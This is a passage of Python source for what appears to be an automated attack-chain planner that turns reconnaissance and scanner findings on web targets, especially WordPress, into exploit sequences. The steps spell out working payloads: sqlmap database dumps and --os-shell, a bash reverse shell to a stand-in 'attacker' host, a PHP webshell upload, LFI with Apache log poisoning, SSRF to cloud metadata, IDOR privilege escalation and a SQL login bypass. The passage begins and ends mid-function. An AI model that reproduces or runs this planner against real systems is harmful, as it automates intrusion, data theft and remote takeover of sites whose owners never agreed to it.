            return self._build_full_url("wp-content/uploads/shell.php")
        if raw.startswith(("http://", "https://")):
            return raw.rstrip("/")
        return self._build_full_url(raw)

    def normalize_endpoint(self, ep: Dict) -> Optional[str]:
        """
        Normalize endpoint object to a proper URL path.
        
        Handles various endpoint field names and formats:
        - url, path, endpoint, uri
        - Strips query strings and fragments if needed
        - Ensures path starts with / for relative paths
        
        Args:
            ep: Endpoint dictionary with url/path/endpoint field
            
        Returns:
            Normalized URL path string, or None if invalid
        """
        if not isinstance(ep, dict):
            return None
        
        # Try multiple field names for URL
        url = ep.get('url') or ep.get('path') or ep.get('endpoint') or ep.get('uri', '')
        
        if not url or not url.strip():
            return None
        
        # Strip whitespace
        url = url.strip()
        
        # If it's already a full URL, return as-is
        if url.startswith(('http://', 'https://')):
            return url.rstrip('/')
        
        # Ensure relative paths start with /
        if not url.startswith('/'):
            url = '/' + url
        
        return url

    def _to_recon_shape(self, endpoint: Any) -> Optional[Dict[str, Any]]:
        normalized = self._url_normalizer.normalize_endpoint(endpoint, base_url=self._get_base_url())
        if not normalized:
            return None
        params = normalized.get("query_params") or normalized.get("parameters") or {}
        return {
            "url": normalized.get("url", ""),
            "canonical_url": normalized.get("normalized_url") or normalized.get("url", ""),
            "host": normalized.get("host", ""),
            "scheme": normalized.get("scheme", ""),
            "port": normalized.get("port"),
            "path": normalized.get("path", "/"),
            "method": normalized.get("method"),
            "params": params if isinstance(params, (dict, list)) else [],
            "source": normalized.get("source") or normalized.get("tool") or "recon",
            "tech_hints": normalized.get("tech_hints", []) or normalized.get("categories", []) or [],
            "auth_hints": normalized.get("auth_hints", []) or [],
            "signals": normalized.get("signals", []) or [],
            "confidence": float(normalized.get("confidence", 0.0) or 0.0),
        }

    def _derive_recon_signals(self, endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        signals: List[Dict[str, Any]] = []
        signal_map: Dict[str, Dict[str, Any]] = {}

        def touch(signal_type: str, score: float, evidence: str):
            current = signal_map.get(signal_type)
            if not current:
                signal_map[signal_type] = {"type": signal_type, "score": score, "evidence": [evidence]}
                return
            current["score"] = max(float(current.get("score", 0.0)), score)
            if evidence not in current["evidence"]:
                current["evidence"].append(evidence)

        for ep in endpoints:
            url = (ep.get("canonical_url") or ep.get("url") or "").lower()
            path = (ep.get("path") or "").lower()
            params = ep.get("params") or {}
            param_keys = []
            if isinstance(params, dict):
                param_keys = [str(k).lower() for k in params.keys()]
            elif isinstance(params, list):
                param_keys = [str(k).lower() for k in params]

            if any(k in path or k in url for k in ("login", "signin", "auth", "session")):
                touch("auth_surface", 0.8, f"path:{path}")
            if any(k in path or k in url for k in ("upload", "file-upload", "multipart")):
                touch("upload_surface", 0.85, f"path:{path}")
            if any(k in path or k in url for k in ("/api/", "graphql", "rest", "swagger")):
                touch("api_surface", 0.75, f"path:{path}")
            if any(k in path or k in url for k in ("user", "enum", "search", "list", "wp-json/wp/v2/users")):
                touch("enum_surface", 0.65, f"path:{path}")
            if any(k in path or k in url for k in ("create", "update", "delete", "edit", "submit", "post", "save")):
                touch("state_change_surface", 0.7, f"path:{path}")
            if any(k in path or k in url for k in ("redirect", "callback", "next", "return", "url=")):
                touch("redirect_surface", 0.7, f"path:{path}")
            if any(k in param_keys for k in ("file", "path", "page", "template", "include", "doc", "download")):
                touch("file_param_surface", 0.78, f"params:{','.join(param_keys[:4])}")
            if param_keys:
                touch("enum_surface", 0.45, f"params:{','.join(param_keys[:3])}")

        for value in signal_map.values():
            value["score"] = max(0.0, min(1.0, float(value.get("score", 0.0))))
            signals.append(value)


        vulns = self._get_planning_vulnerabilities(include_detected=True)
        for v in vulns:
            vtype = v.get("type")
            if vtype == "xmlrpc_enabled":
                touch("xmlrpc_available", 0.8, f"endpoint:{v.get('url')}")
            elif vtype == "user_enumeration":
                touch("usernames_known", 0.7, f"endpoint:{v.get('url')}")


        return signals

    def _derive_primitives(self, signals: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        signal_types = {s.get("type"): s for s in signals}
        primitives: List[Dict[str, Any]] = []

        def add_primitive(
            p_type: str,
            required: List[str],
            optional: List[str],
            base_confidence: float,
        ):
            present_required = [t for t in required if t in signal_types]
            missing_required = [t for t in required if t not in signal_types]
            present_optional = [t for t in optional if t in signal_types]
            if not present_required:
                return
            signal_scores = [float(signal_types[t]["score"]) for t in present_required + present_optional if t in signal_types]
            confidence = (sum(signal_scores) / max(1, len(signal_scores))) * base_confidence
            primitives.append(
                {
                    "type": p_type,
                    "derived_from": present_required + present_optional,
                    "confidence": max(0.0, min(1.0, confidence)),
                    "preconditions_met": present_required + present_optional,
                    "preconditions_missing": missing_required,
                }
            )

        add_primitive("identity_flow_candidate", ["auth_surface", "enum_surface"], ["api_surface"], 0.95)
        add_primitive("content_ingestion_candidate", ["upload_surface", "state_change_surface"], ["api_surface"], 0.95)
        add_primitive("api_object_access_candidate", ["api_surface", "enum_surface"], ["state_change_surface"], 0.9)
        add_primitive("redirect_control_candidate", ["redirect_surface"], ["auth_surface"], 0.8)
        add_primitive("file_resolution_candidate", ["file_param_surface"], ["state_change_surface"], 0.88)
        return primitives

    def _derive_direct_exploit_primitives(self, recon_endpoints: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        primitives: List[Dict[str, Any]] = []
        seen = set()
        findings = self._get_planning_vulnerabilities(include_detected=True)

        def add_direct(primitive_type: str, endpoint: str, evidence: List[str], confidence: float, force_chain: bool = True):
            key = (primitive_type, endpoint)
            if key in seen:
                return
            seen.add(key)
            primitives.append({
                "type": primitive_type,
                "derived_from": evidence[:4],
                "confidence": max(0.0, min(1.0, confidence)),
                "preconditions_met": evidence[:4],
                "preconditions_missing": [],
                "endpoint": endpoint,
                "force_chain": force_chain,
                "planner_mode": "deterministic",
                "evidence_sources": evidence[:6],
                "usability_score": max(0.0, min(1.0, confidence)),
                "missing_preconditions": [],
            })

        for finding in findings:
            if not isinstance(finding, dict):
                continue
            endpoint = str(finding.get("endpoint") or finding.get("url") or "").strip()
            vuln_type = str(finding.get("type") or "").lower()
            confidence = float(finding.get("verification_confidence", finding.get("confidence", 0.0)) or 0.0)
            evidence = [vuln_type]
            if endpoint:
                evidence.append(endpoint)
            if vuln_type in {"sql_injection", "sqli", "injection"}:
                add_direct("sql_injection", endpoint, evidence, max(confidence, 0.82))
            if vuln_type in {"command_injection", "rce", "code_injection"}:
                add_direct("command_injection", endpoint, evidence, max(confidence, 0.9))
            if vuln_type in {"file_upload", "upload"}:
                add_direct("upload_rce", endpoint, evidence, max(confidence, 0.85))
            if vuln_type in {"lfi", "file_inclusion", "path_traversal"}:
                add_direct("lfi_rce", endpoint, evidence, max(confidence, 0.84))
            if vuln_type == "ssrf":
                add_direct("ssrf_pivot", endpoint, evidence, max(confidence, 0.8))
            if vuln_type in {"auth_bypass", "idor", "object_access"}:
                add_direct("auth_object", endpoint, evidence, max(confidence, 0.78), force_chain=False)

            if vuln_type == "xmlrpc_enabled":
                add_direct("xmlrpc_bruteforce_primitive", endpoint, evidence, max(confidence, 0.75))
            if vuln_type == "user_enumeration":
                add_direct("username_list_primitive", endpoint, evidence, max(confidence, 0.7))

        for ep in recon_endpoints:
            if not isinstance(ep, dict):
                continue
            url = str(ep.get("url") or "").lower()
            params = ep.get("params") or {}
            param_names = list(params.keys()) if isinstance(params, dict) else [str(p) for p in params] if isinstance(params, list) else []
            if param_names and any(p in ",".join(param_names).lower() for p in ["id", "item", "user", "cat", "page"]):
                add_direct("sql_injection", ep.get("url", ""), ["parameter_rich", ",".join(param_names[:4])], 0.72, force_chain=False)

        return primitives

    def _build_direct_chain(self, primitive: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        p_type = primitive.get("type", "")
        # Lấy endpoint thực tế từ state, không hardcode
        endpoint = primitive.get("endpoint")
        if not endpoint:
            # Ưu tiên lấy từ prioritized_endpoints
            eps = self.state.get("prioritized_endpoints", []) or self.state.get("endpoints", [])
            for ep in eps:
                url = ep.get("url") if isinstance(ep, dict) else str(ep)
                if url and url.startswith(('http://', 'https://')):
                    endpoint = url
                    break
            if not endpoint:
                endpoint = self.state.get("target")
        if not endpoint:
            # Fallback cuối cùng từ base_url (vẫn dùng logic có sẵn, không hardcode)
            endpoint = self._get_base_url()

        # --- SQL Injection: confirm → dump → os-shell ---
        if p_type == "sql_injection":
            return {
                "chain_id": f"sql_injection_{abs(hash(endpoint))}",
                "goal": f"Exploit SQL injection at {endpoint} to dump data and get RCE",
                "steps": [
                    {
                        "name": "Confirm SQLi",
                        "action": "confirm_sqli",
                        "target": endpoint,
                        "tool": "sqlmap",
                        "payload": "--batch --level=5 --risk=3 --dbms=mysql",
                        "success_indicator": "injectable",
                        "description": "Verify SQL injection with sqlmap"
                    },
                    {
                        "name": "Enumerate databases",
                        "action": "enum_databases",
                        "target": endpoint,
                        "tool": "sqlmap",
                        "payload": "--dbs --batch",
                        "depends_on": ["Confirm SQLi"],
                        "success_indicator": "database list",
                        "description": "List all databases"
                    },
                    {
                        "name": "Dump tables",
                        "action": "dump_tables",
                        "target": endpoint,
                        "tool": "sqlmap",
                        "payload": "--dump --batch --threads=5",
                        "depends_on": ["Enumerate databases"],
                        "success_indicator": "Table dumped",
                        "description": "Extract sensitive data"
                    },
                    {
                        "name": "Write webshell",
                        "action": "write_shell",
                        "target": endpoint,
                        "tool": "sqlmap",
                        "payload": "--os-shell",
                        "depends_on": ["Dump tables"],
                        "success_indicator": "shell created",
                        "description": "Get interactive OS shell"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.95)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "confirm_sqli",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "SQL Injection to RCE",
                "severity": "CRITICAL",
                "risk_level": "CRITICAL",
                "force_chain": True,
                "planner_mode": "deterministic",
            }

        # --- Command Injection: confirm → reverse shell ---
        if p_type == "command_injection":
            return {
                "chain_id": f"command_injection_{abs(hash(endpoint))}",
                "goal": f"Exploit command injection at {endpoint} to get reverse shell",
                "steps": [
                    {
                        "name": "Confirm command injection",
                        "action": "confirm_cmdi",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "; id",
                        "success_indicator": "uid=",
                        "description": "Test with simple command"
                    },
                    {
                        "name": "Get reverse shell",
                        "action": "reverse_shell",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "; bash -i >& /dev/tcp/attacker/4444 0>&1",
                        "depends_on": ["Confirm command injection"],
                        "success_indicator": "shell connected",
                        "description": "Establish reverse shell"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.9)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "confirm_cmdi",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "Command Injection to Reverse Shell",
                "severity": "CRITICAL",
                "risk_level": "CRITICAL",
                "force_chain": True,
                "planner_mode": "deterministic",
            }

        # --- File Upload RCE: test → upload → execute ---
        if p_type == "upload_rce":
            # Dự đoán đường dẫn upload (có thể tinh chỉnh sau)
            upload_dir = endpoint.rstrip('/').rsplit('/', 1)[0] if '/' in endpoint else endpoint
            shell_url = f"{upload_dir}/uploads/shell.php"
            return {
                "chain_id": f"upload_rce_{abs(hash(endpoint))}",
                "goal": f"Upload webshell via {endpoint} and execute commands",
                "steps": [
                    {
                        "name": "Test upload endpoint",
                        "action": "upload_test",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "test.txt",
                        "success_indicator": "uploaded",
                        "description": "Check if upload works"
                    },
                    {
                        "name": "Upload PHP webshell",
                        "action": "upload_php",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "<?php system($_GET['cmd']); ?>",
                        "depends_on": ["Test upload endpoint"],
                        "success_indicator": "shell.php",
                        "description": "Bypass restrictions and upload shell"
                    },
                    {
                        "name": "Execute commands",
                        "action": "exec",
                        "target": shell_url,
                        "tool": "curl",
                        "payload": "?cmd=id",
                        "depends_on": ["Upload PHP webshell"],
                        "success_indicator": "uid=",
                        "description": "Trigger RCE via webshell"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.85)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "upload_test",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "File Upload to RCE",
                "severity": "CRITICAL",
                "risk_level": "CRITICAL",
                "force_chain": True,
                "planner_mode": "deterministic",
            }

        # --- LFI to RCE via log poisoning ---
        if p_type == "lfi_rce":
            return {
                "chain_id": f"lfi_rce_{abs(hash(endpoint))}",
                "goal": f"Exploit LFI at {endpoint} to get RCE via log poisoning",
                "steps": [
                    {
                        "name": "Confirm LFI",
                        "action": "test_lfi",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "../../../../etc/passwd",
                        "success_indicator": "root:",
                        "description": "Read system file"
                    },
                    {
                        "name": "Poison Apache logs",
                        "action": "log_poison",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "<?php system($_GET['cmd']); ?>",
                        "depends_on": ["Confirm LFI"],
                        "success_indicator": "injected",
                        "description": "Inject PHP code into logs"
                    },
                    {
                        "name": "Include poisoned log",
                        "action": "include_log",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "../../../../var/log/apache2/access.log&cmd=id",
                        "depends_on": ["Poison Apache logs"],
                        "success_indicator": "uid=",
                        "description": "Trigger RCE via log inclusion"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.8)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "test_lfi",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "LFI to RCE",
                "severity": "CRITICAL",
                "risk_level": "CRITICAL",
                "force_chain": True,
                "planner_mode": "deterministic",
            }

        # --- SSRF to internal network access ---
        if p_type == "ssrf_pivot":
            return {
                "chain_id": f"ssrf_pivot_{abs(hash(endpoint))}",
                "goal": f"Use SSRF at {endpoint} to scan internal network",
                "steps": [
                    {
                        "name": "Test SSRF",
                        "action": "probe",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "http://169.254.169.254/latest/meta-data/",
                        "success_indicator": "instance-id",
                        "description": "Access cloud metadata"
                    },
                    {
                        "name": "Scan internal ports",
                        "action": "port_scan",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "http://localhost:22",
                        "depends_on": ["Test SSRF"],
                        "success_indicator": "SSH banner",
                        "description": "Discover internal services"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.7)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "probe",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "SSRF to Internal Access",
                "severity": "HIGH",
                "risk_level": "HIGH",
                "force_chain": True,
                "planner_mode": "deterministic",
            }

        # --- IDOR/Auth bypass to privilege escalation ---
        if p_type == "auth_object":
            return {
                "chain_id": f"auth_object_{abs(hash(endpoint))}",
                "goal": f"Exploit IDOR/auth bypass at {endpoint} to escalate privileges",
                "steps": [
                    {
                        "name": "Test IDOR",
                        "action": "idor",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "?id=2",
                        "success_indicator": "other user data",
                        "description": "Access another user's data"
                    },
                    {
                        "name": "Privilege escalation",
                        "action": "priv_esc",
                        "target": endpoint,
                        "tool": "curl",
                        "payload": "?role=admin",
                        "depends_on": ["Test IDOR"],
                        "success_indicator": "admin access",
                        "description": "Become admin"
                    }
                ],
                "evidence": primitive.get("evidence_sources", []),
                "confidence": float(primitive.get("confidence", 0.7)),
                "preconditions_met": primitive.get("preconditions_met", []),
                "preconditions_missing": [],
                "next_step": "idor",
                "terminal_reason": None,
                "primitive": p_type,
                "name": "IDOR to Privilege Escalation",
                "severity": "HIGH",
                "risk_level": "HIGH",
                "force_chain": False,
                "planner_mode": "deterministic",
            }

        return None

        
    def plan_recon_chains_deterministic(self) -> Dict[str, Any]:
        """Deterministic chain planning grounded in confirmed vulns, tech stack, and rules."""
        raw_endpoints = (
            self.state.get("prioritized_endpoints", [])
            or self.state.get("endpoints", [])
            or []
        )
        recon_endpoints = [ep for ep in (self._to_recon_shape(item) for item in raw_endpoints) if ep]
        signals = self._derive_recon_signals(recon_endpoints)
        direct_primitives = self._derive_direct_exploit_primitives(recon_endpoints)
        primitives = direct_primitives + self._derive_primitives(signals)
        signal_map = {s["type"]: s for s in signals}

        # --- enrich primitives with confirmed vulnerability evidence ---
        confirmed_vulns = self.state.get("confirmed_vulnerabilities", []) or []
        tech_stack = list((self.state.get("technologies", {}) or {}).keys())
        wp_version = self.state.get("wp_version", "") or ""

        # Map confirmed vuln types → boost matching primitive confidence + attach endpoint
        vuln_type_map: Dict[str, List[str]] = {}
        for v in confirmed_vulns:
            vt = str(v.get("type", "")).lower()
            url = v.get("url", "") or v.get("endpoint", "")
            if vt and url:
                vuln_type_map.setdefault(vt, []).append(url)

        for prim in primitives:
            ptype = prim.get("type", "").lower()
            for vt, urls in vuln_type_map.items():
                if ptype in vt or vt in ptype or any(k in vt for k in ("sql", "xss", "lfi", "rce", "idor", "ssrf", "xxe")):
                    prim["confidence"] = min(0.95, float(prim.get("confidence", 0.7)) + 0.15)
                    prim["force_chain"] = True
                    prim["confirmed_endpoints"] = urls[:3]
                    prim["evidence_sources"] = list(set(prim.get("evidence_sources", []) + [f"confirmed:{vt}"]))
                    break

        if not recon_endpoints:
            return {"endpoints": [], "signals": signals, "primitives": primitives, "chains": [], "terminal_reason": "no_recon_endpoints"}
        if not primitives:
            return {"endpoints": recon_endpoints, "signals": signals, "primitives": [], "chains": [], "terminal_reason": "insufficient_signal_for_primitives"}

        chains: List[Dict[str, Any]] = []
        for primitive in primitives:
            p_type = primitive.get("type", "")
            direct_chain = self._build_direct_chain(primitive)
            if direct_chain:
                chains.append(direct_chain)
                continue
            missing = primitive.get("preconditions_missing", []) or []
            if len(missing) >= 6:
                continue

            goal = ""
            next_step = ""
            if p_type == "identity_flow_candidate":
                goal = "validate identity and authorization boundary transitions"
                next_step = "enumerate_auth_flow"
            elif p_type == "content_ingestion_candidate":
                goal = "validate content ingestion path and execution boundaries"
                next_step = "test_upload_state_transition"
            elif p_type == "api_object_access_candidate":
                goal = "validate object-level access controls in API surface"
                next_step = "test_api_object_authorization"
            elif p_type == "redirect_control_candidate":
                goal = "validate redirect target control and trust boundaries"
                next_step = "test_redirect_target_validation"
            elif p_type == "file_resolution_candidate":
                goal = "validate file resolution boundary and path handling"
                next_step = "test_file_param_resolution"
            if not goal:
                continue

            derived = primitive.get("derived_from", []) or []
            evidence = []
            for d in derived:
                sig = signal_map.get(d)
                if sig:
                    evidence.extend(sig.get("evidence", [])[:2])

            chains.append(
                {
                    "goal": goal,
                    "steps": [
                        {
                            "name": p_type,
                            "action": next_step,


                            "target": self._get_base_url(),

                            "tool": "deterministic_planner",
                            "payload": "",
                            "success_indicator": "preconditions remain satisfied with additional recon",
                            "description": goal,
                        }
                    ],
                    "evidence": evidence[:5],
                    "confidence": float(primitive.get("confidence", 0.0)),
                    "preconditions_met": primitive.get("preconditions_met", []) or [],
                    "preconditions_missing": missing,
                    "next_step": next_step,
                    "terminal_reason": None,
                    "primitive": p_type,
                    "name": f"Recon chain: {p_type}",
                    "severity": "MEDIUM",
                    "risk_level": "MEDIUM",
                }
            )

        if not chains:
            return {
                "endpoints": recon_endpoints,
                "signals": signals,
                "primitives": primitives,
                "chains": [],
                "terminal_reason": "primitive_preconditions_missing",
            }

        # --- direct chains from confirmed vulnerabilities (highest priority) ---
        for vt, urls in vuln_type_map.items():
            for url in urls[:2]:
                chains.append({
                    "name": f"Confirmed {vt.upper()} exploitation",
                    "goal": f"Exploit confirmed {vt} on {url}",
                    "steps": [{
                        "name": f"exploit_{vt}",
                        "action": f"test_{vt}",
                        "target": url,
                        "tool": "auto",
                        "payload": "",
                        "success_indicator": f"{vt} confirmed by scanner",
                        "description": f"Target confirmed {vt} endpoint",
                    }],
                    "evidence": [f"confirmed:{vt}:{url}"],
                    "confidence": 0.90,
                    "preconditions_met": [f"confirmed_{vt}"],
                    "preconditions_missing": [],
                    "primitive": vt,
                    "severity": "HIGH",
                    "risk_level": "HIGH",
                    "force_chain": True,
                    "source": "confirmed_vuln",
                })

        # --- rule-based chains ---
        rule_chains = self._apply_rules()
        chains.extend(rule_chains)
        if rule_chains:
            logger.info(f"[CHAIN] Added {len(rule_chains)} rule-based chains")

        chains.sort(key=lambda c: (1 if c.get("force_chain") else 0, float(c.get("confidence", 0.0))), reverse=True)
        return {
            "endpoints": recon_endpoints,
            "signals": signals,
            "primitives": primitives,
            "chains": chains,
            "terminal_reason": None,
            "confirmed_vulns_used": len(vuln_type_map),
            "tech_stack": tech_stack,
            "rule_chains": len(rule_chains),
        }

    def plan_chains_from_graph(self, attack_graph) -> List[ExploitChain]:
        """Plan chains from attack graph analysis"""
        chains = []
        
        # Get top attack chains from graph
        graph_chains = attack_graph.get_top_chains(limit=20)
        
        for chain_data in graph_chains:
            chain = self._build_chain_from_graph_path(chain_data, attack_graph)
            if chain:
                chains.append(chain)
        
        # Add fallback heuristics only when we have at least minimal evidence.
        if self._has_minimum_chain_evidence():
            chains.extend(self.plan_chains())
        else:
            logger.info("[CHAIN] Insufficient evidence for heuristic chain generation; skipping fallback chains")

        # Smart prioritization
        chains = self.smart_prioritize(chains)
        
        logger.info(f"[CHAIN] Planned {len(chains)} exploit chains from graph")
        return chains

    def plan_chains_from_context(self, attack_context: Dict) -> List[ExploitChain]:
        """
        Plan exploit chains from enriched attack context.
        Uses AI if available, falls back to heuristic-based generation.
        
        Includes AI triage step for WordPress-specific templates (PRIORITY 5).
        
        Args:
            attack_context: Dict from AIAnalyzer.build_attack_context()
        
        Returns:
            List of planned ExploitChain objects
        """
        chains = []
        
        # Extract context
        endpoints = attack_context.get('endpoints', [])
        all_hints = set(attack_context.get('vulnerability_hints', []))
        patterns = attack_context.get('chain_patterns', [])
        attack_surface = attack_context.get('attack_surface', {})
        
        logger.info(f"[CHAIN] Planning chains from context with {len(all_hints)} hint types and {len(patterns)} patterns")
        
        # ─── PRIORITY 5: AI TRIAGE FOR WORDPRESS ──────────────────────────────────────
        # If WordPress is detected, run AI triage to prioritize WP-specific chains
        wordpress_context = attack_context.get('wordpress', {})
        if wordpress_context.get('detected'):
            logger.info("[CHAIN] WordPress detected - running AI triage for WP-specific templates")
            wp_triage_chains = self._wordpress_ai_triage(attack_context)
            if wp_triage_chains:
                chains.extend(wp_triage_chains)
                logger.info(f"[CHAIN] AI triage generated {len(wp_triage_chains)} WordPress-specific chains")
        
        # Try AI-assisted chain generation first
        if self.groq:
            try:
                # Check if Groq circuit breaker is open (API failing)
                if hasattr(self.groq, '_circuit_state') and self.groq._circuit_state.name == 'OPEN':
                    logger.info("[CHAIN] Groq circuit breaker is OPEN - skipping AI chain generation")
                else:
                    ai_chains = self._generate_chains_with_ai(attack_context)
                    if ai_chains:
                        chains.extend(ai_chains)
                        logger.info(f"[CHAIN] AI generated {len(ai_chains)} chains")
            except Exception as e:
                error_msg = str(e)
                if '403' in error_msg or 'Forbidden' in error_msg:
                    logger.warning("[CHAIN] Groq API 403 Forbidden - AI features disabled for this session")
                    self.groq = None  # Disable Groq for remaining execution
                else:
                    logger.debug(f"[CHAIN] AI chain generation failed: {e}, falling back to heuristics")
        
        # Process identified patterns
        for pattern in patterns:
            chain = self._build_chain_from_pattern(pattern, endpoints)
            if chain:
                chains.append(chain)
                logger.info(f"[CHAIN] Generated pattern-based chain: {chain.name}")
        
        # Generate chains from attack surface
        chains.extend(self._generate_chains_from_attack_surface(attack_surface))
        
        # Generate technology-specific chains
        technologies = attack_context.get('technologies', [])
        chains.extend(self._generate_tech_specific_chains(technologies, endpoints))
        
        # Add chains for misconfigurations
        misconfigs = attack_context.get('misconfigurations', [])
        chains.extend(self._generate_misconfig_chains(misconfigs))
        
        # Priority sort
        chains = self.smart_prioritize(chains)
        
        logger.info(f"[CHAIN] Generated {len(chains)} chains from enriched context")
        return chains

    def _build_chain_from_pattern(self, pattern: Dict, endpoints: List[Dict]) -> Optional[ExploitChain]:
        """Build a chain from an identified attack pattern."""
        pattern_name = pattern.get('name', '')
        description = pattern.get('description', '')
        probability = pattern.get('probability', 0.5)
        
        if probability < 0.4:
            return None  # Skip low-probability patterns
        
        # Map pattern names to chain builders
        if pattern_name == 'file_upload_to_rce':
            upload_ep = pattern.get('upload_endpoint')
            return self._build_upload_to_rce_chain(upload_ep)
        
        elif pattern_name == 'auth_bypass_to_privilege_escalation':
            return self._build_auth_to_priv_chain()
        
        elif pattern_name == 'ssrf_chain':
            return self._build_ssrf_exploitation_chain()
        
        elif pattern_name == 'enum_then_attack':
            return self._build_enum_attack_chain()
        
        return None

    def _generate_chains_from_attack_surface(self, attack_surface: Dict) -> List[ExploitChain]:
        """Generate chains targeting specific attack surface elements."""
        chains = []
        
        # File upload endpoints
        upload_eps = attack_surface.get('file_upload_endpoints', [])
        if upload_eps:
            for ep in upload_eps[:3]:  # Limit to top 3
                chain = self._build_upload_to_rce_chain(ep.get('url'))
                if chain:
                    chains.append(chain)
        
        # Authentication endpoints
        auth_eps = attack_surface.get('auth_endpoints', [])
        if auth_eps:
            chains.append(self._build_auth_to_priv_chain(auth_eps[0]))
        
        # API endpoints
        api_eps = attack_surface.get('api_endpoints', [])
        if api_eps:
            chains.append(self._build_api_attack_chain(api_eps[0]))
        
        # Admin endpoints
        admin_eps = attack_surface.get('admin_endpoints', [])
        if admin_eps:
            chains.append(self._build_admin_access_chain(admin_eps[0]))
        
        return chains

    def _generate_tech_specific_chains(self, technologies: List[str], endpoints: List[Dict]) -> List[ExploitChain]:
        """Generate chains based on detected technologies."""
        chains = []
        tech_lower = [t.lower() for t in (technologies or [])]
        
        # WordPress
        if any('wordpress' in t or 'wp' in t for t in tech_lower):
            wp_eps = [e for e in endpoints if 'wp' in e.get('url', '').lower()]
            if wp_eps:
                chains.append(self._build_wordpress_attack_chain(wp_eps[0]))
        
        # PHP
        if any('php' in t for t in tech_lower):
            chains.append(self._build_php_exploitation_chain(endpoints))
        
        # Node.js / Express
        if any('node' in t or 'express' in t for t in tech_lower):
            chains.append(self._build_nodejs_attack_chain(endpoints))
        
        return chains

    def _generate_misconfig_chains(self, misconfigs: List[Dict]) -> List[ExploitChain]:
        """Generate chains that exploit misconfigurations."""
        chains = []
        
        for misconfig in misconfigs[:5]:
            config_type = misconfig.get('type', '')
            endpoint = misconfig.get('endpoint', '')
            severity = misconfig.get('severity', 'MEDIUM')
            
            if config_type == 'admin_panel_unauthenticated':
                chains.append(self._build_pattern_chain(
                    name="Unauthenticated Admin Access",
                    description="Access exposed admin panel without authentication",
                    steps=[
                        ExploitStep(
                            name="Access admin panel",
                            action="direct_access",
                            target=endpoint,
                            tool="browser",
                            success_indicator="Admin panel loaded"
                        ),
                        ExploitStep(
                            name="Exploit admin functions",
                            action="admin_exploitation",
                            target=endpoint,
                            tool="curl",
                            success_indicator="System compromised"
                        )
                    ],
                    risk_level="CRITICAL"
                ))
            
            elif config_type == 'debug_endpoint_exposed':
                chains.append(self._build_pattern_chain(
                    name="Debug Endpoint Information Disclosure",
                    description="Extract sensitive information from exposed debug endpoint",
                    steps=[
                        ExploitStep(
                            name="Access debug endpoint",
                            action="information_gathering",
                            target=endpoint,
                            tool="browser",
                            success_indicator="Debug information visible"
                        ),
                        ExploitStep(
                            name="Extract credentials",
                            action="credential_extraction",
                            target=endpoint,
                            tool="curl",
                            success_indicator="Credentials obtained"
                        )
                    ],
                    risk_level="HIGH"
                ))
            
            elif config_type == 'backup_file_exposed':
                chains.append(self._build_pattern_chain(
                    name="Backup File Extraction",
                    description="Download and analyze backup files for sensitive data",
                    steps=[
                        ExploitStep(
                            name="Download backup file",
                            action="file_download",
                            target=endpoint,
                            tool="wget",
                            success_indicator="Backup file downloaded"
                        ),
                        ExploitStep(
                            name="Extract sensitive data",
                            action="data_extraction",
                            target=endpoint,
                            tool="custom_script",
                            success_indicator="Credentials/secrets obtained"
                        )
                    ],
                    risk_level="HIGH"
                ))
        
        return chains

    def _build_upload_to_rce_chain(self, upload_url: str) -> Optional[ExploitChain]:
        """Build file upload to RCE chain."""
        if not upload_url:
            return None
        
        return self._build_pattern_chain(
            name="File Upload to Remote Code Execution",
            description=f"Upload malicious file via {upload_url} and achieve RCE",
            steps=[
                ExploitStep(
                    name="Test upload endpoint",
                    action="upload_test",
                    target=upload_url,
                    tool="curl",
                    success_indicator="File uploaded successfully"
                ),
                ExploitStep(
                    name="Bypass upload restrictions",
                    action="bypass_restrictions",
                    target=upload_url,
                    tool="curl",
                    payload=".php.jpg / .phtml",
                    success_indicator="Restriction bypassed"
                ),
                ExploitStep(
                    name="Upload webshell",
                    action="file_upload",
                    target=upload_url,
                    tool="curl",
                    payload="<?php system($_GET['cmd']); ?>",
                    success_indicator="Webshell uploaded"
                ),
                ExploitStep(
                    name="Execute commands",
                    action="code_execution",
                    target=self._build_full_url(upload_url.split('/')[-1]),
                    tool="curl",
                    success_indicator="Remote code execution achieved"
                )
            ],
            risk_level="CRITICAL"
        )

    def _build_auth_to_priv_chain(self, auth_ep: Dict = None) -> ExploitChain:
        """Build authentication bypass to privilege escalation chain."""
        target = auth_ep.get('url') if auth_ep else "login"
        
        return self._build_pattern_chain(
            name="Authentication Bypass and Privilege Escalation",
            description="Bypass authentication and escalate privileges to admin",
            steps=[
                ExploitStep(
                    name="Test authentication bypass",
                    action="auth_bypass_test",
                    target=target,
                    tool="curl",
                    payload="admin:admin / ' OR '1'='1",
